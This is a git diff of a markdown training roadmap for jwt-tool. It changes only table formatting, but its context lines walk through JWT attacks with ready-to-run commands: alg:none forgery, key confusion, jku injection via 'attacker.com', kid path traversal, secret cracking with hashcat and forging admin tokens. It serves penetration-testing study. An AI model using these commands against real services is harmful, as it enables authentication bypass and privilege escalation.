@@ -19,7 +19,7 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | API Testing | Token & Session Security | Web Interception | Web Fuzzing |
-|:------------|:-------------------------|:-----------------|:------------|
+| :------------ | :------------------------- | :----------------- | :------------ |
 | [[Postman\|📬 Postman]] | **🔐 jwt-tool** (you are here) | [[Burp_Suite\|🕷️ Burp Suite]] | [[ffuf\|🌀 ffuf]] |
 | [[SoapUI\|🧼 SoapUI]] | [[Cookie-Editor\|🍪 Cookie-Editor]] | [[OWASP_ZAP\|🛡️ OWASP ZAP]] | [[Gobuster\|📂 Gobuster]] |
 
@@ -28,7 +28,7 @@
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 4 | 1–2 hours |
 | 2 | Decoding and Analysis | 3 | 1–2 hours |
 | 3 | Core Attacks | 5 | 3–4 hours |
@@ -37,7 +37,7 @@
 | 6 | Integration | 2 | 1 hour |
 | 7 | Practical Labs | 3 | 3–5 hours |
 | 8 | Mastery Challenges | 2 | 2–3 hours |
-| | **Total** | **25** | **~15–23 hours** |
+|| **Total** | **25** | **~15–23 hours** |
 
 ---
 
@@ -50,7 +50,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Format** | `header.payload.signature` — three base64url-encoded parts joined by dots. |
 | **Header** | `{"alg":"HS256","typ":"JWT"}` — algorithm and token type. |
 | **Payload** | `{"sub":"1234","name":"alice","role":"user","iat":1234567890}` — claims. |
@@ -64,7 +64,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **alg:none** | Header `"alg":"none"` → signature not verified. Any payload accepted. |
 | **RS256 → HS256 Confusion** | RSA key pair: private (server signs) + public (server verifies). If you forge a token signed with the RS256 public key using HS256 (HMAC), and the server uses the public key as the HMAC secret → accepted. |
 | **Weak Secret** | HS256/HS512 with weak/guessable secret → crack offline with hashcat. |
@@ -78,7 +78,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Install** | `git clone https://github.com/ticarpi/jwt_tool; pip3 install -r requirements.txt`. |
 | **Run** | `python3 jwt_tool.py <token>`. |
 | **Kali** | May be available: `pip3 install jwt_tool` or from the github. |
@@ -90,7 +90,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **base64url** | JWT uses base64url (not standard base64): `+` → `-`, `/` → `_`, no padding `=`. |
 | **Tamper Detection** | Any modification to header or payload invalidates the signature — unless the server doesn't verify it (alg:none) or you have the secret. |
 | **Claim Priority** | `sub` = subject (user ID). `role`/`admin` = access level. `exp` = expiry. `iat` = issued at. `jti` = unique ID (prevents replay). |
@@ -106,7 +106,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `python3 jwt_tool.py <token>`. Prints decoded header and payload. |
 | **Online** | jwt.io — paste token → decoded (not for real engagements, sends token to third party). |
 | **Manual** | `echo "base64_part" | base64 -d` (add padding if needed). |
@@ -118,7 +118,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Algorithm** | Header `alg` field: `HS256`/`HS512` = HMAC (symmetric). `RS256`/`RS512` = RSA (asymmetric). `ES256` = ECDSA. `none` = no signature (bug if accepted). |
 | **Target Claims** | Look for: `role`, `admin`, `is_admin`, `group`, `user_id`, `email`. These are attack targets — modify to escalate. |
 
@@ -129,7 +129,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `python3 jwt_tool.py <token> -t http://target.com/api/endpoint -rh "Authorization: Bearer JWT" -M pb`. |
 | **Playbook Scan** | `-M pb` — runs through all known JWT attacks automatically. Reports which attacks succeed. |
 
@@ -144,7 +144,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `python3 jwt_tool.py <token> -X a`. Generates tokens with `alg:none` and empty signature. |
 | **Claim Modification** | Add `-T` flag to tamper with claims before attack: `python3 jwt_tool.py <token> -X a -T`. |
 | **Test** | Send the forged token. If accepted: server doesn't verify algorithm. |
@@ -156,7 +156,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Prerequisite** | Original token uses RS256. Get the server's RSA public key (often at `/.well-known/jwks.json`, `/.well-known/openid-configuration`, or in server response headers). |
 | **Command** | `python3 jwt_tool.py <token> -X k -pk public_key.pem`. Signs the forged token with the public key as HMAC secret. Changes `alg` to HS256. |
 | **Success** | If server confuses the public key as the HMAC secret → accepts the forged token. |
@@ -168,7 +168,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Interactive** | `python3 jwt_tool.py <token> -T` — interactive tamper mode. Prompts to modify each claim. Generates tokens with modified claims (still need the secret to re-sign). |
 | **Use Case** | Tamper + alg:none = forge admin token without knowing secret. Tamper + known secret = re-sign with new claims. |
 
@@ -179,7 +179,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | JWT header `jku` parameter specifies URL of JWKS (JSON Web Key Set) that contains the signing key. If the server fetches from an attacker-controlled URL: serve malicious JWKS → sign token with corresponding private key → server accepts. |
 | **Command** | `python3 jwt_tool.py <token> -X s -ju http://attacker.com/jwks.json`. Generates key pair, hosts JWKS (or tells you what to host), forges token signed with attacker's key. |
 
@@ -190,7 +190,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | `kid` (Key ID) header parameter tells the server which key to use. If used unsafely in SQL query (SQL injection) or path traversal: `kid: ../../../../dev/null` → server reads empty file as key → HMAC of empty string = known value → sign token accordingly. |
 | **Test** | Try path traversal values in `kid`. Use `python3 jwt_tool.py <token> -T` to modify kid manually. |
 
@@ -205,7 +205,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `python3 jwt_tool.py <token> -C -d wordlist.txt` — dictionary attack on HS256 secret. |
 | **Wordlists** | `rockyou.txt`. Common JWT secrets: `secret`, `password`, `jwt_secret`, `your-256-bit-secret`. Try default secrets first. |
 
@@ -216,7 +216,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Mode** | Hashcat mode 16500 = JWT (HS256). `hashcat -m 16500 jwt.txt wordlist.txt`. |
 | **Format** | Pass the full JWT as the hash: `hashcat -m 16500 "header.payload.signature" wordlist.txt`. |
 | **Speed** | Much faster than jwt_tool for large wordlists (GPU). |
@@ -228,7 +228,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Forge** | With the secret: modify any claim → re-sign: `python3 jwt_tool.py <token> -T -S hs256 -p "cracked_secret"`. |
 | **Escalate** | Change `"role":"user"` → `"role":"admin"`. Re-sign with cracked secret. Use forged token. |
 
@@ -243,7 +243,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Test** | Try sending an expired token. If accepted: `exp` claim not validated. |
 | **Remove exp** | `python3 jwt_tool.py <token> -T` → remove/extend `exp` claim → re-sign if possible. |
 
@@ -254,7 +254,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | RFC 7515 allows embedding a JWK (JSON Web Key) directly in the JWT header. If the server uses the embedded key for verification without validation → attacker embeds their own public key → signs with corresponding private key → accepted. |
 | **Command** | `python3 jwt_tool.py <token> -X e` — embedded JWK injection. |
 
@@ -265,7 +265,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Test** | Remove the signature portion completely (keep trailing dot: `header.payload.`). Some implementations don't validate an absent signature. |
 | **jwt_tool** | `-X n` — null signature attack. |
 
@@ -280,7 +280,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Proxy** | `python3 jwt_tool.py <token> -t http://target -rh "Authorization: Bearer JWT" -pr http://127.0.0.1:8080` — route requests through Burp. |
 | **JWT Editor Extension** | Burp Extension: "JWT Editor" — directly in Burp: decode, modify, attack JWT tokens in intercepted requests. Install from BAppStore. |
 
@@ -291,7 +291,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | Log in → get JWT → decode with jwt_tool → identify claims → run playbook scan → if vulnerable: forge admin token → test escalated access. |
 
 ---
@@ -352,7 +352,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can decode and analyze a JWT manually | ☐ |
 | Can execute the alg:none attack | ☐ |
 | Can execute RS256 → HS256 algorithm confusion | ☐ |
